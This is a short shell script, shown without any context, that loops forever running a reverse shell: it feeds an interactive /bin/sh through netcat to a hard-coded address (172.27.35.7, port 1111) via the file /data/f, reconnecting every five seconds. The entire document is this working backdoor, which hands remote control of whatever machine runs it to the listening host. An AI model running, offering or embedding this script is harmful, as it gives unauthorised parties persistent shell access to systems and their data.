#!/bin/sh

while true
do
        cat /data/f|/bin/sh -i 2>&1|nc 172.27.35.7 1111 >/data/f
        sleep 5
done

